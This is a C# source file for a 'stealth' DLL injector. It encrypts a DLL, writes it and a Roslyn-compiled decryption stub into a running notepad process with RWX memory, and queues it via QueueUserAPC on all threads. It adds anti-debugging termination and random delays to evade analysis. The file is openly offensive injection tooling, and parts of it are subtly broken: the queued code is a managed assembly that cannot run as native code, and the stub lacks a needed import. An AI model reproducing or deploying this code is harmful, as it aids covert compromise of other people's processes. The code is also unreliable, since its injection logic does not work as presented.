using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using Microsoft.CodeAnalysis;
using Microsoft.CodeAnalysis.CSharp;
using Microsoft.CodeAnalysis.Emit;

class AdvancedStealthDllInjector
{
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualFreeEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint dwFreeType);

    [DllImport("kernel32.dll")]
    static extern bool QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenThread(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hObject);

    const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
    const uint MEM_COMMIT = 0x1000;
    const uint MEM_RESERVE = 0x2000;
    const uint MEM_RELEASE = 0x8000;
    const uint PAGE_EXECUTE_READWRITE = 0x40;
    const uint THREAD_SET_CONTEXT = 0x0010;

    static void Main()
    {
        AntiDebuggingChecks();

        string targetProcessName = "notepad";
        Process targetProcess = GetTargetProcess(targetProcessName);
        if (targetProcess == null)
        {
            Console.WriteLine("Target process not running.");
            return;
        }

        RandomDelay();

        byte[] key = GenerateRandomBytes(32); // AES-256 key
        byte[] iv = GenerateRandomBytes(16);  // AES block size IV

        string dllPath = @"C:\Path\To\Your\Stealth.dll"; // Replace with your path
        byte[] dllBuffer = File.ReadAllBytes(dllPath);
        byte[] encryptedDllBuffer = EncryptData(dllBuffer, key, iv);

        IntPtr procHandle = OpenProcess(PROCESS_ALL_ACCESS, false, targetProcess.Id);
        if (procHandle == IntPtr.Zero)
        {
            Console.WriteLine("Failed to open target process.");
            return;
        }

        RandomDelay();

        IntPtr allocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)encryptedDllBuffer.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (allocMemAddress == IntPtr.Zero)
        {
            Console.WriteLine("Failed to allocate memory in target process.");
            CloseHandle(procHandle);
            return;
        }

        if (!WriteProcessMemory(procHandle, allocMemAddress, encryptedDllBuffer, (uint)encryptedDllBuffer.Length, out int bytesWritten))
        {
            Console.WriteLine("Failed to write encrypted DLL to target process memory.");
            VirtualFreeEx(procHandle, allocMemAddress, 0, MEM_RELEASE);
            CloseHandle(procHandle);
            return;
        }

        byte[] compiledCode = CompileDecryptionCode(key, iv);
        IntPtr codeAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)compiledCode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (codeAddress == IntPtr.Zero)
        {
            Console.WriteLine("Failed to allocate memory for decryption code in target process.");
            VirtualFreeEx(procHandle, allocMemAddress, 0, MEM_RELEASE);
            CloseHandle(procHandle);
            return;
        }

        if (!WriteProcessMemory(procHandle, codeAddress, compiledCode, (uint)compiledCode.Length, out bytesWritten))
        {
            Console.WriteLine("Failed to write decryption code to target process memory.");
            VirtualFreeEx(procHandle, codeAddress, 0, MEM_RELEASE);
            VirtualFreeEx(procHandle, allocMemAddress, 0, MEM_RELEASE);
            CloseHandle(procHandle);
            return;
        }

        foreach (ProcessThread thread in targetProcess.Threads)
        {
            IntPtr threadHandle = OpenThread(THREAD_SET_CONTEXT, false, (uint)thread.Id);
            if (threadHandle != IntPtr.Zero)
            {
                QueueUserAPC(codeAddress, threadHandle, allocMemAddress); // Добавление APC
                CloseHandle(threadHandle);
            }
        }

        Console.WriteLine("DLL injection via APC queued.");
        CloseHandle(procHandle);
    }

    static Process GetTargetProcess(string processName)
    {
        Process[] processes = Process.GetProcessesByName(processName);
        return processes.Length > 0 ? processes[0] : null;
    }

    static byte[] GenerateRandomBytes(int length)
    {
        byte[] randomBytes = new byte[length];
        using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
        {
            rng.GetBytes(randomBytes);
        }
        return randomBytes;
    }

    static byte[] EncryptData(byte[] data, byte[] key, byte[] iv)
    {
        using (Aes aesAlg = Aes.Create())
        {
            aesAlg.Key = key;
            aesAlg.IV = iv;
            aesAlg.Padding = PaddingMode.PKCS7;
            ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);
            return encryptor.TransformFinalBlock(data, 0, data.Length);
        }
    }

    static byte[] CompileDecryptionCode(byte[] key, byte[] iv)
    {
        string code = $@"
            using System;
            using System.Security.Cryptography;
            using System.Runtime.InteropServices;

            public class DecryptionHelper
            {{
                public static void Decrypt(byte[] encryptedData, byte[] key, byte[] iv)
                {{
                    using (Aes aesAlg = Aes.Create())
                    {{
                        aesAlg.Key = key;
                        aesAlg.IV = iv;
                        aesAlg.Padding = PaddingMode.PKCS7;
                        ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
                        byte[] result = decryptor.TransformFinalBlock(encryptedData, 0, encryptedData.Length);
                        Console.WriteLine(Encoding.UTF8.GetString(result));
                    }}
                }}
            }}
        ";

        return CompileCode(code);
    }

    static byte[] CompileCode(string code)
    {
        SyntaxTree syntaxTree = CSharpSyntaxTree.ParseText(code);
        string assemblyName = Path.GetRandomFileName();
        var references = AppDomain.CurrentDomain.GetAssemblies().Where(a => !a.IsDynamic).Select(a => MetadataReference.CreateFromFile(a.Location)).ToArray();

        CSharpCompilation compilation = CSharpCompilation.Create(
            assemblyName,
            new[] { syntaxTree },
            references,
            new CSharpCompilationOptions(OutputKind.DynamicallyLinkedLibrary));

        using (var ms = new MemoryStream())
        {
            EmitResult result = compilation.Emit(ms);
            if (!result.Success)
            {
                var failures = result.Diagnostics.Where(diagnostic =>
                    diagnostic.IsWarningAsError || diagnostic.Severity == DiagnosticSeverity.Error);

                foreach (var diagnostic in failures)
                {
                    Console.Error.WriteLine("{0}: {1}", diagnostic.Id, diagnostic.GetMessage());
                }
                return null;
            }
            else
            {
                ms.Seek(0, SeekOrigin.Begin);
                return ms.ToArray();
            }
        }
    }

    static void AntiDebuggingChecks()
    {
        if (Debugger.IsAttached)
        {
            Environment.FailFast("Debugger detected and application terminated.");
        }
    }

    static void RandomDelay()
    {
        Random rnd = new Random();
        int delay = rnd.Next(1000, 5000); // Delay between 1 and 5 seconds
        Thread.Sleep(delay);
    }
}
